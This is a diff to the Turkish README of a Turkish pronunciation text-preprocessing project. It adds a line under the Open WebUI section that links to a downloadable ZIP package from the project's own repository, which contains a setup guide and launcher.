@@ -26,6 +26,8 @@ python3 -m pera_telaffuz < metin.txt
 
 ## Open WebUI
 
+**Kolay kurulum için [Open WebUI paketini indirin](https://github.com/mcanerg/pera-turkce-telaffuz/raw/refs/heads/main/pera-turkce-telaffuz-open-webui.zip).** ZIP içindeki rehberi izleyin. Başlatıcı ve güncel rehber bu paketin içindedir.
+
 OpenAI uyumlu bir ses motoru kullanıyorsanız [Open WebUI kurulum rehberine](docs/open-webui.md) bakın. Deneysel bağlantı, sohbet yazısını değiştirmeden ses motoruna gönderilen metni hazırlar.
 
 ## Kendi yerel asistanına ekle
